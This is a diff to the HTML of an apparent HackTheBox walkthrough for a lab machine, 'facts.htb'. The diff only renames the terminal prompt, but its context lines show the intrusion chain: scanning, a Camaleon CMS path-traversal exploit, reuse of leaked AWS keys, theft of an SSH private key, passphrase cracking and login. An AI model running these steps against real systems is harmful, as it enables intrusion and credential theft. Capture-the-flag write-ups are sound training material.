@@ -272,7 +272,7 @@
               class="w-10 h-10 rounded-sm border-2 border-gray-700 object-cover transition-transform duration-300 transform group-hover:scale-105"
               style="animation: border-breathe 4s ease-in-out infinite;" />
             <span class="text-white text-lg sm:text-xl md:text-2xl lg:text-3xl font-semibold tracking-wide">
-              root@epangelinan: cd
+              root@pangelinan: cd
               <span class="inline-block ml-2" style="animation: flicker 1.6s steps(2, end) infinite;">_</span>
             </span>
           </a>
@@ -499,7 +499,7 @@
     <span class="text-xs text-gray-600 font-mono">///</span>
   </div>
   <div class="codewrap overflow-x-auto">
-    <div class="p-4"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>root㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>/home/esteban/HackTheBox<span style="color:#f92672">]</span>
+    <div class="p-4"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>root㉿pangelinan<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/HackTheBox<span style="color:#f92672">]</span>
 </span></span><span style="display:flex;"><span>└─# nmap -sC -sV -oN nmap_tcp.txt 10.129.53.63 --min-rate<span style="color:#f92672">=</span><span style="color:#ae81ff">10000</span></span></span></code></pre></div></div>
   </div>
 </div>
@@ -557,7 +557,7 @@ The website was a collection of fun facts, and I noticed there were no obvious e
     <span class="text-xs text-gray-600 font-mono">///</span>
   </div>
   <div class="codewrap overflow-x-auto">
-    <div class="p-4"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>root㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>/home/esteban/HackTheBox<span style="color:#f92672">]</span>
+    <div class="p-4"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>root㉿pangelinan<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/HackTheBox<span style="color:#f92672">]</span>
 </span></span><span style="display:flex;"><span>└─# gobuster dir -u <span style="color:#e6db74">&#34;http://facts.htb&#34;</span> -w ../SecLists/Discovery/Web-Content/common.txt -t <span style="color:#ae81ff">25</span> --timeout 20s</span></span></code></pre></div></div>
   </div>
 </div>
@@ -718,7 +718,7 @@ On my attacker machine, I fetched the following script from ExploitDB and conver
     <span class="text-xs text-gray-600 font-mono">///</span>
   </div>
   <div class="codewrap overflow-x-auto">
-    <div class="p-4"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>root㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>/home/esteban/HackTheBox<span style="color:#f92672">]</span>
+    <div class="p-4"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>root㉿pangelinan<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/HackTheBox<span style="color:#f92672">]</span>
 </span></span><span style="display:flex;"><span>└─# python3 exploit.py                         
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>Camaleon CMS v2.9.0 - Path Traversal PoC <span style="color:#f92672">(</span>authorized testing only<span style="color:#f92672">)</span>
@@ -788,7 +788,7 @@ I knew that <strong>/proc/self/cwd</strong> was a very common path for web appli
     <span class="text-xs text-gray-600 font-mono">///</span>
   </div>
   <div class="codewrap overflow-x-auto">
-    <div class="p-4"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>root㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>/home/esteban/HackTheBox<span style="color:#f92672">]</span>
+    <div class="p-4"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>root㉿pangelinan<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/HackTheBox<span style="color:#f92672">]</span>
 </span></span><span style="display:flex;"><span>└─# python3 exploit.py                         
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>Camaleon CMS v2.9.0 - Path Traversal PoC <span style="color:#f92672">(</span>authorized testing only<span style="color:#f92672">)</span>
@@ -908,7 +908,7 @@ Turned to this:</p>
     <span class="text-xs text-gray-600 font-mono">///</span>
   </div>
   <div class="codewrap overflow-x-auto">
-    <div class="p-4"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>root㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>/home/esteban/HackTheBox<span style="color:#f92672">]</span>
+    <div class="p-4"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>root㉿pangelinan<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/HackTheBox<span style="color:#f92672">]</span>
 </span></span><span style="display:flex;"><span>└─# sqlite3 dump.sqlite3 
 </span></span><span style="display:flex;"><span>SQLite version 3.46.1 2024-08-13 09:16:08
 </span></span><span style="display:flex;"><span>Enter <span style="color:#e6db74">&#34;.help&#34;</span> <span style="color:#66d9ef">for</span> usage hints.
@@ -972,7 +972,7 @@ Setting up the configuration:</p>
     <span class="text-xs text-gray-600 font-mono">///</span>
   </div>
   <div class="codewrap overflow-x-auto">
-    <div class="p-4"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>root㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>/home/esteban/HackTheBox<span style="color:#f92672">]</span>
+    <div class="p-4"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>root㉿pangelinan<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/HackTheBox<span style="color:#f92672">]</span>
 </span></span><span style="display:flex;"><span>└─# aws configure                                  
 </span></span><span style="display:flex;"><span>AWS Access Key ID: AKIA0BFCF1A5C7112990
 </span></span><span style="display:flex;"><span>AWS Secret Access Key: ei0GZaLK24JLkHyLJHMKRs3WsazqkDqUt+z0Jj+i
@@ -993,7 +993,7 @@ Setting up the configuration:</p>
     <span class="text-xs text-gray-600 font-mono">///</span>
   </div>
   <div class="codewrap overflow-x-auto">
-    <div class="p-4"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>root㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>/home/esteban/HackTheBox<span style="color:#f92672">]</span>
+    <div class="p-4"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>root㉿pangelinan<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/HackTheBox<span style="color:#f92672">]</span>
 </span></span><span style="display:flex;"><span>└─# aws --endpoint-url http://facts.htb:54321 s3 ls --recursive
 </span></span><span style="display:flex;"><span>2025-09-11 05:06:52 internal
 </span></span><span style="display:flex;"><span>2025-09-11 05:06:52 randomfacts</span></span></code></pre></div></div>
@@ -1012,7 +1012,7 @@ Setting up the configuration:</p>
     <span class="text-xs text-gray-600 font-mono">///</span>
   </div>
   <div class="codewrap overflow-x-auto">
-    <div class="p-4"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>root㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>/home/esteban/HackTheBox<span style="color:#f92672">]</span>
+    <div class="p-4"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>root㉿pangelinan<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/HackTheBox<span style="color:#f92672">]</span>
 </span></span><span style="display:flex;"><span>└─# aws --endpoint-url http://facts.htb:54321 s3 cp s3://internal/ ./internal_dump --recursive</span></span></code></pre></div></div>
   </div>
 </div>
@@ -1029,18 +1029,18 @@ Setting up the configuration:</p>
     <span class="text-xs text-gray-600 font-mono">///</span>
   </div>
   <div class="codewrap overflow-x-auto">
-    <div class="p-4"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>root㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>/home/esteban/HackTheBox<span style="color:#f92672">]</span>
+    <div class="p-4"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>root㉿pangelinan<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/HackTheBox<span style="color:#f92672">]</span>
 </span></span><span style="display:flex;"><span>└─# cd internal_dump 
 </span></span><span style="display:flex;"><span>                                                           
-</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>root㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>/home/esteban/HackTheBox/internal_dump<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>root㉿pangelinan<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/HackTheBox/internal_dump<span style="color:#f92672">]</span>
 </span></span><span style="display:flex;"><span>└─# ls -a
 </span></span><span style="display:flex;"><span>.   .bash_logout  .bundle  .lesshst  .ssh
 </span></span><span style="display:flex;"><span>..  .bashrc       .cache   .profile
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>root㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>/home/esteban/HackTheBox/internal_dump<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>root㉿pangelinan<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/HackTheBox/internal_dump<span style="color:#f92672">]</span>
 </span></span><span style="display:flex;"><span>└─# cd .ssh         
 </span></span><span style="display:flex;"><span>                                                             
-</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>root㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>/home/esteban/HackTheBox/internal_dump/.ssh<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>root㉿pangelinan<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/HackTheBox/internal_dump/.ssh<span style="color:#f92672">]</span>
 </span></span><span style="display:flex;"><span>└─# ls   
 </span></span><span style="display:flex;"><span>authorized_keys  id_ed25519</span></span></code></pre></div></div>
   </div>
@@ -1058,7 +1058,7 @@ Setting up the configuration:</p>
     <span class="text-xs text-gray-600 font-mono">///</span>
   </div>
   <div class="codewrap overflow-x-auto">
-    <div class="p-4"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>root㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>/home/esteban/HackTheBox<span style="color:#f92672">]</span>
+    <div class="p-4"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>root㉿pangelinan<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/HackTheBox<span style="color:#f92672">]</span>
 </span></span><span style="display:flex;"><span>└─# ssh -i cloned_key trivia@facts.htb          
 </span></span><span style="display:flex;"><span>Enter passphrase <span style="color:#66d9ef">for</span> key <span style="color:#e6db74">&#39;cloned_key&#39;</span>: </span></span></code></pre></div></div>
   </div>
@@ -1076,10 +1076,10 @@ Setting up the configuration:</p>
     <span class="text-xs text-gray-600 font-mono">///</span>
   </div>
   <div class="codewrap overflow-x-auto">
-    <div class="p-4"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>root㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>/home/esteban/HackTheBox<span style="color:#f92672">]</span>
+    <div class="p-4"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>root㉿pangelinan<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/HackTheBox<span style="color:#f92672">]</span>
 </span></span><span style="display:flex;"><span>└─# ssh2john cloned_key &gt; cloned_key_hash.txt
 </span></span><span style="display:flex;"><span>                                                             
-</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>root㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>/home/esteban/HackTheBox<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>root㉿pangelinan<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/HackTheBox<span style="color:#f92672">]</span>
 </span></span><span style="display:flex;"><span>└─# john cloned_key_hash.txt --wordlist<span style="color:#f92672">=</span>/usr/share/wordlists/rockyou.txt 
 </span></span><span style="display:flex;"><span>Using default input encoding: UTF-8
 </span></span><span style="display:flex;"><span>Loaded <span style="color:#ae81ff">1</span> password hash <span style="color:#f92672">(</span>SSH, SSH private key <span style="color:#f92672">[</span>RSA/DSA/EC/OPENSSH 32/64<span style="color:#f92672">])</span>
@@ -1114,7 +1114,7 @@ Setting up the configuration:</p>
     <span class="text-xs text-gray-600 font-mono">///</span>
   </div>
   <div class="codewrap overflow-x-auto">
-    <div class="p-4"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>root㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>/home/esteban/HackTheBox<span style="color:#f92672">]</span>
+    <div class="p-4"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>root㉿pangelinan<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/HackTheBox<span style="color:#f92672">]</span>
 </span></span><span style="display:flex;"><span>└─# ssh -i cloned_key trivia@facts.htb
 </span></span><span style="display:flex;"><span>Enter passphrase <span style="color:#66d9ef">for</span> key <span style="color:#e6db74">&#39;cloned_key&#39;</span>: 
 </span></span><span style="display:flex;"><span>Last login: Wed Jan <span style="color:#ae81ff">28</span> 16:17:19 UTC <span style="color:#ae81ff">2026</span> from 10.10.14.4 on ssh
